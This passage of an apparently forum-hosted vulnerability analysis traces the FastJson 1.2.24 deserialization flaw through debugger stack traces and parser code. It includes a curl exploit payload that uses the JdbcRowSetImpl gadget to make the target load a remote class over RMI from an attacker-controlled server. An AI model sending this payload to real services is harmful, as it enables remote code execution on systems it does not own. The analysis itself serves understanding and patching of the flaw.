
2. 构建payload触发漏洞

使用`curl`发送`payload`：

```bash
curl <服务端ip>:<端口号>/user -H "Content-Type:application/json" -d '{"b":{"@type":"com.sn.rowset.JdbcRowSetImpl","dataSourceName":"rmi://<恶意文件服务器主机ip>:<端口号>/TouchFile","autoCommit":true}}'
```

## 漏洞分析

### 观察异常堆栈

当恶意代码执行完毕后，由于后续的状态的校验没有通过，会触发异常，返回调用堆栈。（请启用断点中的异常断点）

截取主要部分：

整个堆栈大致可以分为两部分：

1. 1-7行，为`JdbcRowSetImpl`中反射调用利用链流程。
2. 8-末，为`FastJson`中的反序列化处理流程。

```java
1  java.sql.SQLException: JdbcRowSet (连接) JNDI 无法连接
2  at com.sun.rowset.JdbcRowSetImpl.connect(Unknown Source) ~[na:1.8.0_102]
3  at com.sun.rowset.JdbcRowSetImpl.setAutoCommit(Unknown Source) ~[na:1.8.0_102]
4  at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_102]
5  at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[na:1.8.0_102]
6  at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[na:1.8.0_102]
7  at java.lang.reflect.Method.invoke(Unknown Source) ~[na:1.8.0_102]
8  at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:96) ~[fastjson-1.2.24.jar!/:na]
9  at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:593) ~[fastjson-1.2.24.jar!/:na]
10 at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:922) ~[fastjson-1.2.24.jar!/:na]
11 at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_2_JdbcRowSetImpl.deserialze(Unknown Source) ~[na:na]
12 at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184) ~[fastjson-1.2.24.jar!/:na]
13 at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368) ~[fastjson-1.2.24.jar!/:na]
14 at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327) ~[fastjson-1.2.24.jar!/:na]
15 at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293) ~[fastjson-1.2.24.jar!/:na]
16 at com.alibaba.fastjson.parser.DefaultJSONParser.parseExtra(DefaultJSONParser.java:1490) ~[fastjson-1.2.24.jar!/:na]
17 at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:766) ~[fastjson-1.2.24.jar!/:na]
18 at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:600) ~[fastjson-1.2.24.jar!/:na]
19 at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:922) ~[fastjson-1.2.24.jar!/:na]
20 at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_User.deserialze(Unknown Source) ~[na:na]
21 at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184) ~[fastjson-1.2.24.jar!/:na]
22 at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:639) ~[fastjson-1.2.24.jar!/:na]
23 at com.alibaba.fastjson.JSON.parseObject(JSON.java:339) ~[fastjson-1.2.24.jar!/:na]
24 at com.alibaba.fastjson.JSON.parseObject(JSON.java:307) ~[fastjson-1.2.24.jar!/:na]
25 at com.alibaba.fastjson.JSON.parseObject(JSON.java:270) ~[fastjson-1.2.24.jar!/:na]
26 at com.alibaba.fastjson.JSON.parseObject(JSON.java:370) ~[fastjson-1.2.24.jar!/:na]
27 at com.alibaba.fastjson.JSON.parseObject(JSON.java:452) ~[fastjson-1.2.24.jar!/:na]
```

### 流程跟踪

#### 针对`JdbcRowSetImpl`中反射调用利用链流程跟踪。

`JdbcRowSetImpl`这条利用链也算比较经典，主要利用了Java的反射机制触发漏洞。

在`Method.invoke`处设置断点，发送`Payload`触发断点。

可以看见`setAutoCommit`方法被调用了，这也就是`Payload`中设置`AutoCommit:false`的原因（其实`true`/`false`无所谓，只是为了触发反射调用。）

![](https://bbs.kanxue.com/upload/attach/202105/876724_XNHWDBWT8Z32RRT.png)

随后进入`setAutoCommit`源码，发现调用了`connect`，继续跟进。

![](https://bbs.kanxue.com/upload/attach/202105/876724_M595TUBTAUYJ72D.png)

跟进后发现了JNDI初始化流程，而这里的`getDataSourceName`，返回的便是我们`Payload`中`DataSouceName`。

`lookup`中的参数可控，就和`exec`参数可控一样，具有很高的危险性。

至此，通过`RMI`协议加载并实例化远程类，触发构造方法、静态方法等等，达到了攻击的目的。

![](https://bbs.kanxue.com/upload/attach/202105/876724_49689W265UF4W5H.png)

#### 针对`FastJson`中的反序列化处理流程跟踪。

##### `JSON.parseObject`

`JSON.parseObject`主要做了这么几件事：

- 将输入的byte字节数组转为String

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_GEST2DH9MUQ5U2S.png)

- 创建并初始化`DefaultJSONParer`解析器

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_ERX7BG45KMFWKPV.png)

- 使用解析器解析输入流

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_WZG32F529BUM57P.png)

##### `DefaultJSONParser.parseObject`

`JSON.parseObject`主要做了这么几件事：

- 创建`User`类的序列化器

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_CETBN78ZX9TWEHY.png)

- 使用序列化器反序列化

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_2USYSN5QATHFZQ5.png)

##### `JavaBeanDeserializer.deserialze`

这里的`JavaBeanDeserializer.deserialze`对应着上面的序列化器。

采用了`JAVA`的`ASM`技术动态的生成了类，并使用其创建了序列化器。

其主要做了以下几件事：

- 遍历`JSON`字符串，查看是否有对应的字段，有则填充

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_KT4JZW5ZZ9TUEAF.png)

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_JS2CN2ZX4NEJXZ5.png)

- 当并未在字符串中扫描到对应的字段时，流程会走向`JavaBeanDeserializer.parseField`

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_FTDMZMJZF885857.png)

##### `JavaBeanDeserializer.parseField`

`JavaBeanDeserializer.parseField`内会做如下几件事：

- 调用`smartMatch`，尝试从已有的`FieldDeserializers`中匹配字段反序列化器

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_F367G754P4GA9WK.png)

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_8NJSDKKHD64K6GV.png)

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_JX5CQWRRE5UKN27.png)

- 当没有匹配到对应的反序列化器时，流程走向`DefaultJSONParser.parseExtra`

  而`parseExtra`内会匹配`extraTypeProviders`，匹配失败的话流程走向`DefaultJSONParser.parse`

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_VMDSKHG258BJXHD.png)

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_J4GVA3XH5B6MSFU.png)

##### `DefaultJSONParser.parse`

`DefaultJSONParser.parse`内会做如下几件事：

- 根据`lexer`选择执行流程，`lexer`在最开始初始化`DefaultJSONParer`内完成。

  这里的`LBRACE`对应着字符`{`。然后调用`DefaultJSONParer.parseObject`一个重载再次解析。

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_W52M3AH4PGJV9JP.png)

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_WCTSPP4HYF9SSQA.png)

  ![](https://bbs.kanxue.com/upload/attach/202105/876724_RM9FCBX7FYU6N6V.png)

###### `DefaultJSONParer.parseObject`

重点来了，流程如下：

1. 解析`JSON`格式的`payload`，扫描到`@type`字段后，使用类加载器加载对应的类`JdbcRowSetImpl`。这里也是`FastJson`这个漏洞的主要的点，没有正确的处理`@type`流程，自动加载了任意工厂类，导致了漏洞的发生，后的补丁也是在此处增加黑白名单用于过滤已知的可利用的类。

   ![](https://bbs.kanxue.com/upload/attach/202105/876724_48GUZZW9RY33HFP.png)

2. 获取`JdbcRowSetImpl`的序列化器进行反序列化

   ![](https://bbs.kanxue.com/upload/attach/202105/876724_BQ8H6T3QDW6CRPB.png)

3. 在反序列化时，通过反射调用触发漏洞。

   ![](https://bbs.kanxue.com/upload/attach/202105/876724_VWSN2F5EY7SSWB7.png)

   ![](https://bbs.kanxue.com/upload/attach/202105/876724_GNRQJMYE8AC22QZ.png)

### 漏洞总结

关于反序列系列的漏洞，我们通常关注的两个点：

- 反序列化链
- 如何触发反序列化链的调用

如前边所展现的`com.sn.rowset.JdbcRowSetImpl`便是一条反序列化链，通过设置`dataSourceName`与`autoCommit`属性，通过反射机制达到加载恶意类文件目的。

类似的利用链还有`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`

而接下来的`FastJson`一系列的调用，便是对反序列化的链的一个利用。

可以发现，在首次反序列化失败后，流程会扫描传入的`JSON`字符串，并根据`@type`字段的值进行指定类型的构造，这也是此次漏洞主要的点。

在`FastJson`更高版本的补丁中便是增加了对`@type`类型进行了一系列的检查过滤。

*参考*
